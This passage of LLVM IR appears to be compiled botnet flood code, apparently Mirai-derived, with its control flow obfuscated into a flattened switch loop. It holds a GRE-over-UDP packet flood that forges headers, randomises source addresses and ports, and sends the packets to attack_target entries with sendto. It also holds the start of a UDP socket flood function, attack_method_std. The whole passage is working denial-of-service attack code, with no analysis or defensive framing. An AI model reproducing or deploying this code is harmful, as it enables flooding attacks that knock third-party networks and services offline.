  %197 = add i64 28, %196
  %198 = trunc i64 %197 to i16
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 2
  store i16 %199, i16* %201, align 2
  %202 = load i16, i16* %13, align 2
  %203 = zext i16 %202 to i32
  %204 = xor i32 %203, -1
  %205 = trunc i32 %204 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 3
  store i16 %206, i16* %208, align 4
  %209 = load i8, i8* %14, align 1
  %210 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 5
  store i8 %209, i8* %211, align 4
  %212 = load i8, i8* %15, align 1
  %213 = icmp ne i8 %212, 0
  %214 = select i1 %213, i32 1761561898, i32 1046759815
  store i32 %214, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %217 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 4
  store i16 %216, i16* %218, align 2
  store i32 1046759815, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 6
  store i8 17, i8* %221, align 1
  %222 = call i32 @rand_next()
  %223 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 8
  store i32 %222, i32* %224, align 4
  %225 = load i8, i8* %20, align 1
  %226 = icmp ne i8 %225, 0
  %227 = select i1 %226, i32 1650244553, i32 2047238626
  store i32 %227, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 9
  %231 = load i32, i32* %230, align 4
  %232 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 9
  store i32 %231, i32* %233, align 4
  store i32 -334667144, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 8
  %237 = load i32, i32* %236, align 4
  %238 = sub i32 %237, 1024
  %239 = xor i32 %238, -1
  %240 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 9
  store i32 %239, i32* %241, align 4
  store i32 -334667144, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i16, i16* %16, align 2
  %244 = call zeroext i16 @htons(i16 zeroext %243) #7
  %245 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 0
  store i16 %244, i16* %246, align 2
  %247 = load i16, i16* %17, align 2
  %248 = call zeroext i16 @htons(i16 zeroext %247) #7
  %249 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %250 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %249, i32 0, i32 1
  store i16 %248, i16* %250, align 2
  %251 = load i32, i32* %18, align 4
  %252 = sext i32 %251 to i64
  %253 = add i64 8, %252
  %254 = trunc i64 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #7
  %256 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %257 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %256, i32 0, i32 2
  store i16 %255, i16* %257, align 2
  store i32 1603919363, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i32, i32* %9, align 4
  %260 = add nsw i32 %259, 1
  store i32 %260, i32* %9, align 4
  store i32 1014391780, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  store i32 -2104106592, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -488097294, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i32, i32* %9, align 4
  %265 = load i8, i8* %5, align 1
  %266 = zext i8 %265 to i32
  %267 = icmp slt i32 %264, %266
  %268 = select i1 %267, i32 690669722, i32 -1353627716
  store i32 %268, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8**, i8*** %11, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds i8*, i8** %270, i64 %272
  %274 = load i8*, i8** %273, align 8
  store i8* %274, i8** %30, align 8
  %275 = load i8*, i8** %30, align 8
  %276 = bitcast i8* %275 to %struct.iphdr*
  store %struct.iphdr* %276, %struct.iphdr** %31, align 8
  %277 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i64 1
  %279 = bitcast %struct.iphdr* %278 to %struct.grehdr*
  store %struct.grehdr* %279, %struct.grehdr** %32, align 8
  %280 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %281 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %280, i64 1
  %282 = bitcast %struct.grehdr* %281 to %struct.ethhdr*
  store %struct.ethhdr* %282, %struct.ethhdr** %33, align 8
  %283 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %284 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %283, i64 1
  %285 = bitcast %struct.ethhdr* %284 to %struct.iphdr*
  store %struct.iphdr* %285, %struct.iphdr** %34, align 8
  %286 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i64 1
  %288 = bitcast %struct.iphdr* %287 to %struct.udphdr*
  store %struct.udphdr* %288, %struct.udphdr** %35, align 8
  %289 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %290 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %289, i64 1
  %291 = bitcast %struct.udphdr* %290 to i8*
  store i8* %291, i8** %36, align 8
  %292 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %295, i32 0, i32 2
  %297 = load i8, i8* %296, align 4
  %298 = zext i8 %297 to i32
  %299 = icmp slt i32 %298, 32
  %300 = select i1 %299, i32 1665774889, i32 -12268529
  store i32 %300, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 1
  %307 = load i32, i32* %306, align 4
  %308 = call i32 @ntohl(i32 %307) #7
  %309 = call i32 @rand_next()
  %310 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 2
  %315 = load i8, i8* %314, align 4
  %316 = zext i8 %315 to i32
  %317 = lshr i32 %309, %316
  %318 = add i32 %308, %317
  %319 = call i32 @htonl(i32 %318) #7
  %320 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 9
  store i32 %319, i32* %321, align 4
  store i32 -12268529, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i32, i32* %21, align 4
  %324 = icmp eq i32 %323, -1
  %325 = select i1 %324, i32 274299786, i32 -704048595
  store i32 %325, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  %327 = call i32 @rand_next()
  %328 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 8
  store i32 %327, i32* %329, align 4
  store i32 -704048595, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i16, i16* %13, align 2
  %332 = zext i16 %331 to i32
  %333 = icmp eq i32 %332, 65535
  %334 = select i1 %333, i32 833236925, i32 772699391
  store i32 %334, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = call i32 @rand_next()
  %337 = and i32 %336, 65535
  %338 = trunc i32 %337 to i16
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  %341 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 3
  %343 = load i16, i16* %342, align 4
  %344 = zext i16 %343 to i32
  %345 = sub nsw i32 %344, 1000
  %346 = xor i32 %345, -1
  %347 = trunc i32 %346 to i16
  %348 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 3
  store i16 %347, i16* %349, align 4
  store i32 772699391, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = load i16, i16* %16, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp eq i32 %352, 65535
  %354 = select i1 %353, i32 -1578804232, i32 -34645880
  store i32 %354, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = call i32 @rand_next()
  %357 = and i32 %356, 65535
  %358 = trunc i32 %357 to i16
  %359 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i32 0, i32 0
  store i16 %358, i16* %360, align 2
  store i32 -34645880, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = load i16, i16* %17, align 2
  %363 = zext i16 %362 to i32
  %364 = icmp eq i32 %363, 65535
  %365 = select i1 %364, i32 -672366990, i32 1881391771
  store i32 %365, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = call i32 @rand_next()
  %368 = and i32 %367, 65535
  %369 = trunc i32 %368 to i16
  %370 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 1
  store i16 %369, i16* %371, align 2
  store i32 1881391771, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = load i8, i8* %20, align 1
  %374 = icmp ne i8 %373, 0
  %375 = select i1 %374, i32 1825325296, i32 -938376794
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %379 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %378, i32 0, i32 9
  store i32 %377, i32* %379, align 4
  store i32 -710691380, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  %381 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 9
  %383 = load i32, i32* %382, align 4
  %384 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 9
  store i32 %383, i32* %385, align 4
  store i32 -710691380, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  store i32 %387, i32* %37, align 4
  %388 = call i32 @rand_next()
  store i32 %388, i32* %38, align 4
  %389 = call i32 @rand_next()
  store i32 %389, i32* %39, align 4
  %390 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %391 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %390, i32 0, i32 0
  %392 = getelementptr inbounds [6 x i8], [6 x i8]* %391, i32 0, i32 0
  %393 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %392, i8* %393, i32 4)
  %394 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %395 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %394, i32 0, i32 1
  %396 = getelementptr inbounds [6 x i8], [6 x i8]* %395, i32 0, i32 0
  %397 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %396, i8* %397, i32 4)
  %398 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %399 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %398, i32 0, i32 0
  %400 = getelementptr inbounds [6 x i8], [6 x i8]* %399, i32 0, i32 0
  %401 = getelementptr inbounds i8, i8* %400, i64 4
  %402 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %401, i8* %402, i32 2)
  %403 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %404 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %403, i32 0, i32 1
  %405 = getelementptr inbounds [6 x i8], [6 x i8]* %404, i32 0, i32 0
  %406 = getelementptr inbounds i8, i8* %405, i64 4
  %407 = bitcast i32* %39 to i8*
  %408 = getelementptr inbounds i8, i8* %407, i64 2
  call void @util_memcpy(i8* %406, i8* %408, i32 2)
  %409 = load i8, i8* %19, align 1
  %410 = icmp ne i8 %409, 0
  %411 = select i1 %410, i32 2143645345, i32 -1884505602
  store i32 %411, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i8*, i8** %36, align 8
  %414 = load i32, i32* %18, align 4
  call void @rand_str(i8* %413, i32 %414)
  store i32 -1884505602, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  %416 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 7
  store i16 0, i16* %417, align 2
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = bitcast %struct.iphdr* %418 to i16*
  %420 = call zeroext i16 @checksum_generic(i16* %419, i32 20)
  %421 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 7
  store i16 %420, i16* %422, align 2
  %423 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 7
  store i16 0, i16* %424, align 2
  %425 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %426 = bitcast %struct.iphdr* %425 to i16*
  %427 = call zeroext i16 @checksum_generic(i16* %426, i32 20)
  %428 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 7
  store i16 %427, i16* %429, align 2
  %430 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %431 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %430, i32 0, i32 3
  store i16 0, i16* %431, align 2
  %432 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %433 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %434 = bitcast %struct.udphdr* %433 to i8*
  %435 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %436 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %435, i32 0, i32 2
  %437 = load i16, i16* %436, align 2
  %438 = load i32, i32* %18, align 4
  %439 = sext i32 %438 to i64
  %440 = add i64 8, %439
  %441 = trunc i64 %440 to i32
  %442 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %432, i8* %434, i16 zeroext %437, i32 %441)
  %443 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %444 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %443, i32 0, i32 3
  store i16 %442, i16* %444, align 2
  %445 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %446 = load i32, i32* %9, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 0
  %450 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %449, i32 0, i32 0
  store i16 2, i16* %450, align 4
  %451 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i32 0, i32 9
  %453 = load i32, i32* %452, align 4
  %454 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %455 = load i32, i32* %9, align 4
  %456 = sext i32 %455 to i64
  %457 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %454, i64 %456
  %458 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %457, i32 0, i32 0
  %459 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %458, i32 0, i32 2
  %460 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %459, i32 0, i32 0
  store i32 %453, i32* %460, align 4
  %461 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %462 = load i32, i32* %9, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %461, i64 %463
  %465 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %464, i32 0, i32 0
  %466 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %465, i32 0, i32 1
  store i16 0, i16* %466, align 2
  %467 = load i32, i32* %10, align 4
  %468 = load i8*, i8** %30, align 8
  %469 = load i32, i32* %18, align 4
  %470 = sext i32 %469 to i64
  %471 = add i64 66, %470
  %472 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %473 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %474 = load i32, i32* %9, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %473, i64 %475
  %477 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %476, i32 0, i32 0
  %478 = bitcast %struct.sockaddr_in* %477 to %struct.sockaddr*
  store %struct.sockaddr* %478, %struct.sockaddr** %472, align 8
  %479 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %480 = load %struct.sockaddr*, %struct.sockaddr** %479, align 8
  %481 = call i64 @sendto(i32 %467, i8* %468, i64 %471, i32 16384, %struct.sockaddr* %480, i32 16)
  store i32 62195668, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load i32, i32* %9, align 4
  %484 = add nsw i32 %483, 1
  store i32 %484, i32* %9, align 4
  store i32 -488097294, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  store i32 -2104106592, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %485, %482, %415, %412, %386, %380, %376, %372, %366, %361, %355, %350, %335, %330, %326, %322, %301, %269, %263, %262, %261, %258, %242, %234, %228, %219, %215, %162, %158, %104, %98, %97, %94, %88, %87, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  store i32 %49, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -616785340, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -616785340, label %first
    i32 -1138538303, label %52
    i32 1854587705, label %55
    i32 1755895620, label %58
    i32 -1213769070, label %59
    i32 39238920, label %65
    i32 -360005542, label %75
    i32 -749603774, label %84
    i32 -1387657398, label %93
    i32 -878376666, label %101
    i32 561103314, label %102
    i32 1001947086, label %120
    i32 1056289052, label %121
    i32 -1026692278, label %131
    i32 419167806, label %157
    i32 -1374297545, label %175
    i32 1652258433, label %176
    i32 -1920187934, label %177
    i32 900963338, label %180
    i32 -849184331, label %181
    i32 819955137, label %182
    i32 438929603, label %188
    i32 -1113095946, label %197
    i32 503103815, label %201
    i32 -955774606, label %211
    i32 1635020186, label %214
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %50 = icmp eq i32 %.reload, 65535
  %51 = select i1 %50, i32 -1138538303, i32 1854587705
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  store i32 1755895620, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #7
  store i16 %57, i16* %13, align 2
  store i32 1755895620, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1213769070, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  %64 = select i1 %63, i32 39238920, i32 900963338
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %67 = load i8**, i8*** %10, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  store i8* %66, i8** %70, align 8
  %71 = load i16, i16* %12, align 2
  %72 = zext i16 %71 to i32
  %73 = icmp eq i32 %72, 65535
  %74 = select i1 %73, i32 -360005542, i32 -749603774
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  %78 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 0
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %82, i32 0, i32 1
  store i16 %77, i16* %83, align 2
  store i32 -1387657398, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i16, i16* %12, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %85) #7
  %87 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i64 %89
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %90, i32 0, i32 0
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %91, i32 0, i32 1
  store i16 %86, i16* %92, align 2
  store i32 -1387657398, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %95 = load i32*, i32** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  store i32 %94, i32* %98, align 4
  %99 = icmp eq i32 %94, -1
  %100 = select i1 %99, i32 -878376666, i32 561103314
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  ret void

; <label>:102:                                    ; preds = %loopEntry
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %103, align 4
  %104 = load i16, i16* %13, align 2
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  store i32 0, i32* %107, align 4
  %108 = load i32*, i32** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %114 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %114, %struct.sockaddr** %113, align 8
  %115 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %116 = load %struct.sockaddr*, %struct.sockaddr** %115, align 8
  %117 = call i32 @bind(i32 %112, %struct.sockaddr* %116, i32 16) #6
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 1001947086, i32 1056289052
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 1056289052, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i64 %124
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i32 0, i32 2
  %127 = load i8, i8* %126, align 4
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %128, 32
  %130 = select i1 %129, i32 -1026692278, i32 419167806
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
